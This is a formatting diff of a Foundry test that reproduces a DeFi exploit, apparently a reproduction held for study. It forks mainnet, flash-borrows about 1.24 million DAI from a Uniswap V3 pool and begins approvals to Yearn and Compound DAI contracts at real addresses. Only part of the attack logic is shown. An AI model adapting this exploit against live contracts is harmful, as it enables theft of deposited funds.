@@ -18,10 +18,7 @@ interface IcDAI {
 
     function deposit(uint256 _amount, bool _autoStakeInStakingPool) external;
 
-    function withdraw(
-        uint256 _shares,
-        bool _autoWithdrawInStakingPool
-    ) external;
+    function withdraw(uint256 _shares, bool _autoWithdrawInStakingPool) external;
 }
 
 interface IyDAI {
@@ -52,16 +49,13 @@ contract ContractTest is Test {
     IERC20 yUSDT = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
     IERC20 yTUSD = IERC20(0x73a052500105205d34Daf004eAb301916DA8190f);
     IERC20 CentreUSDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    Uni_Pair_V3 DAIUSDCPool =
-        Uni_Pair_V3(0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168);
-    ICurveSwap CurveFiSwap =
-        ICurveSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
-    IStrategyCurve StrategyDAICurve =
-        IStrategyCurve(0xaf274e912243b19B882f02d731dacd7CD13072D0);
+    Uni_Pair_V3 DAIUSDCPool = Uni_Pair_V3(0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168);
+    ICurveSwap CurveFiSwap = ICurveSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
+    IStrategyCurve StrategyDAICurve = IStrategyCurve(0xaf274e912243b19B882f02d731dacd7CD13072D0);
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 17426064);
+        cheats.createSelectFork("mainnet", 17_426_064);
         cheats.label(address(DAI), "DAI");
         cheats.label(address(cDAI), "cDAI");
         cheats.label(address(yDAI), "yDAI");
@@ -75,27 +69,15 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint(
-            "Attacker amount of DAI before hack",
-            DAI.balanceOf(address(this)),
-            DAI.decimals()
-        );
+        emit log_named_decimal_uint("Attacker amount of DAI before hack", DAI.balanceOf(address(this)), DAI.decimals());
 
         // Step 1. Flashloan 1_239 DAI through Uniswap V3 flash loans
         DAIUSDCPool.flash(address(this), 1_239_990 * 1e18, 0, "");
 
-        emit log_named_decimal_uint(
-            "Attacker amount of DAI after hack",
-            DAI.balanceOf(address(this)),
-            DAI.decimals()
-        );
+        emit log_named_decimal_uint("Attacker amount of DAI after hack", DAI.balanceOf(address(this)), DAI.decimals());
     }
 
-    function uniswapV3FlashCallback(
-        uint256 fee0,
-        uint256 fee1,
-        bytes calldata data
-    ) external {
+    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
         // Approvals
         DAI.approve(address(yDAI), type(uint256).max);
         DAI.approve(address(cDAI), type(uint256).max);
